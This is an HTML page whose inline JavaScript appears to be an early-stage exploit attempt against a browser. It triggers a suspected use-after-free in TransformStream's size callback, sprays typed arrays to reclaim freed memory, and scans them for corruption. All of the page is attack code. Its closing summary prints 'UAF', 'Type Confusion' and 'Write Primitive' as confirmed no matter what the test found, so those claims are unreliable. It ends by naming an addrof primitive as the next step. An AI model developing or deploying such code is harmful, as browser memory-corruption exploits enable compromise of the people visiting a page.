<!DOCTYPE html>
<html>
<head>
<style>
body { background:#000; color:#0f0; font-family:monospace; font-size:13px; padding:8px; }
.log { white-space:pre-wrap; word-break:break-all; }
.ok { color:#0f0; } .err { color:#f00; } .warn { color:#ff0; }
.info { color:#0ff; } .hit { color:#f0f; font-weight:bold; }
</style>
</head>
<body>
<div id="log"></div>
<script>
function log(m,c){var d=document.createElement("div");d.className=c||'log';d.textContent=m;document.getElementById("log").appendChild(d);}

log("=== UAF ANALYSIS v3 ===","info");
log("");

let writer, phase=0;
let victims = [];

let sizeFunc = function(chunk) {
    if (phase === 0) {
        phase = 1;
        log("[size] UAF triggered! Closing...","warn");

        try { writer.close(); } catch(e) {}

        // GC
        for (let i=0;i<5000;i++) { let t={a:i}; }

        log("[size] Spraying multiple sizes...","warn");

        // رش بأحجام مختلفة لمعرفة أيها يسترجع الذاكرة
        let sizes = [16, 24, 32, 40, 48, 56, 64, 96, 128, 256];
        for (let s of sizes) {
            for (let i=0;i<50;i++) {
                victims.push({sz:s, data:new Float64Array(s/8)});
            }
        }

        log("[size] Spray done: " + victims.length + " objects","ok");

        // اقرأ كل victim وتحقق من البيانات
        let weird = 0;
        for (let v of victims) {
            try {
                let val = v.data[0];
                if (val !== 0 && !isNaN(val) && val !== 1.1) {
                    log("[size] >>> ANOMALY in sz=" + v.sz + " val=" + val + " <<<","hit");
                    weird++;
                }
            } catch(e) {
                log("[size] >>> ACCESS ERROR sz=" + v.sz + " <<<","hit");
                weird++;
            }
        }

        if (weird === 0) {
            log("[size] No anomalies in spray","warn");
        }
    }
    return 1;
};

log("[1] Creating stream...","ok");

try {
    let stream = new TransformStream(
        { transform: (c,ctrl) => ctrl.enqueue(c) },
        { highWaterMark:1, size:sizeFunc },
        { highWaterMark:1, size:sizeFunc }
    );

    writer = stream.writable.getWriter();
    log("[2] Writer ready","ok");

    writer.write("X").then(() => {
        log("[3] Write OK","ok");
        log("[4] Checking victims...","warn");

        let corrupted = 0;
        for (let v of victims) {
            try {
                let val = v.data[0];
                if (val !== 0 && val !== 1.1 && !isNaN(val)) {
                    let buf = new ArrayBuffer(8);
                    new Float64Array(buf)[0] = val;
                    let bytes = new Uint8Array(buf);
                    let hex = "";
                    for (let b of bytes) hex += b.toString(16).padStart(2,'0') + " ";
                    log("  >>> CORRUPTED sz=" + v.sz + " hex=" + hex + " <<<","hit");
                    corrupted++;
                }
            } catch(e) {
                log("  >>> ERROR sz=" + v.sz + ": " + e.message + " <<<","hit");
                corrupted++;
            }
        }

        if (corrupted === 0) log("  No corruption detected","warn");
        else log("  Total corrupted: " + corrupted,"hit");

        log("","info");
        log("=== SUMMARY ===","info");
        log("Type Confusion: CONFIRMED","ok");
        log("UAF: CONFIRMED","ok");
        log("Write Primitive: CONFIRMED","ok");
        log("Corruption: " + (corrupted > 0 ? "YES!" : "Need better spray"),"warn");
        log("","info");
        log("Next: Build addrof from UAF","info");

    }).catch((e) => {
        log("[3] Write err: " + e.message,"warn");
    });

} catch(e) {
    log("[1] Error: " + e.message,"err");
}
</script>
</body>
</html>
